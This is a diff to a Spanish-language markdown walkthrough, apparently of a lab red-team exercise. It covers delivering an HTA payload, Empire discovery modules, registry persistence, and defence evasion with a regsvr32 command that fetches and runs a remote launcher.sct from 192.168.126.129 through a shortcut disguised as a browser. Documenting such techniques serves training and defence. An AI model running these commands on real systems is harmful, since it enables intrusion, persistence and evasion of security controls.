@@ -131,15 +131,18 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 ![image](https://i.imgur.com/Ap8ghR1.jpg)
   
 3. Agente Activo
+ 
 ![image](https://i.imgur.com/9Q5JA25.jpg)
   
 4. Descubrimiento
+  
 > whoami
-> usemodule situational_awareness/host/antivirusproduct 
-> usemodule situational_awareness/host/get_uaclevel 
-> usemodule situational_awareness/host/winenum
+usemodule situational_awareness/host/antivirusproduct 
+usemodule situational_awareness/host/get_uaclevel 
+usemodule situational_awareness/host/winenum
 
 ![image](https://i.imgur.com/8DjskSO.jpg)
+
 5. Persistencia
 > usemodule persistence/userland/registry
 > set Listener: http
@@ -147,7 +150,9 @@ Enviamos un link de descarga o mail http://192.168.126.129/Resume.hta
 ![image](https://i.imgur.com/loz2sRu.jpg)
 
 6. Evasión de defensa
+  
 -Ejecución con regsvr32 y scripting. Se crea un acceso directo enmascarango un navegador web con target:
+  
 > C:\Windows\System32\cmd.exe /c "C:\Windows\System32\regsvr32.exe /s /n /u /i:http:\192.168.126.129:8080\launcher.sct scrobj.dll"
 
 ![image](https://i.imgur.com/maJN0cy.jpg)
